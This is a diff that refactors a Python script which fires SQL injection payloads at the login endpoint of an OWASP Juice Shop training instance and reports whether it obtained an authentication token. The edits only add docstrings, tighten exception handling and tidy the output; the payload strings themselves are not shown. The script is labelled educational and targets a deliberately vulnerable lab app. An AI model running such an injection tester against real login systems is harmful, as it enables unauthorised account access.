@@ -1,13 +1,21 @@
 #!/usr/bin/env python3
-# SQL Injection Attack Script
-# For educational purposes only
+"""
+SQL Injection Attack Script
 
-import requests
-import json
+This script tests a Juice Shop instance for common SQL injection vulnerabilities
+in the login form.
+
+For educational purposes only.
+"""
+
 import time
+import requests
 
 def test_sql_injection(target_ip, payload_username, payload_password):
-    # Test SQL injection on Juice Shop login
+    """
+    Attempts a login with a given SQL injection payload.
+    Returns a tuple of (success, message).
+    """
     login_url = f"http://{target_ip}:3000/rest/user/login"
     
     payload = {
@@ -26,40 +34,34 @@ def test_sql_injection(target_ip, payload_username, payload_password):
             response_data = response.json()
             if "authentication" in response_data and "token" in response_data["authentication"]:
                 return True, "SQL injection successful - bypassed login!"
-            else:
-                return False, "Login response received but no token found"
-        else:
-            return False, f"HTTP {response.status_code} - Login failed"
+            return False, "Login response received but no token found"
+        return False, f"HTTP {response.status_code} - Login failed"
             
     except requests.exceptions.Timeout:
         return False, "Request timeout"
     except requests.exceptions.ConnectionError:
         return False, "Connection error"
-    except Exception as e:
+    except requests.exceptions.RequestException as e:
         return False, f"Error: {str(e)}"
 
 def main():
+    """Main function to run the SQL injection attack script."""
     print("SQL Injection Attack Script")
     print("Educational use only!")
     print("")
     
-    # Get target IP
     target_ip = input("Enter Juice Shop IP address: ")
     
-    # Test connection
     print(f"Testing connection to {target_ip}:3000...")
     try:
-        response = requests.get(f"http://{target_ip}:3000", timeout=5)
+        requests.get(f"http://{target_ip}:3000", timeout=5)
         print("Connection successful!")
-    except:
+    except requests.exceptions.RequestException:
         print("Cannot reach target. Make sure Juice Shop is running.")
         return
     
-    print("")
-    print("Testing SQL injection payloads...")
-    print("")
+    print("\nTesting SQL injection payloads...\n")
     
-    # SQL injection payloads
     payloads = [
         {
             "name": "Admin bypass attempt",
@@ -94,22 +96,19 @@ def main():
             print(f"  Result: FAILED - {message}")
         
         print("")
-        time.sleep(1)  # Small delay between attempts
+        time.sleep(1)
     
-    # Show results
     print("=== Attack Results ===")
     if successful_attacks:
         print(f"Successful SQL injections: {len(successful_attacks)}")
         for attack in successful_attacks:
             print(f"  ✓ {attack}")
-        print("")
-        print("WARNING: Application is vulnerable to SQL injection!")
+        print("\nWARNING: Application is vulnerable to SQL injection!")
     else:
         print("No successful SQL injections found")
         print("Application may be protected against SQL injection")
     
-    print("")
-    print("Attack finished.")
+    print("\nAttack finished.")
 
 if __name__ == "__main__":
     main()
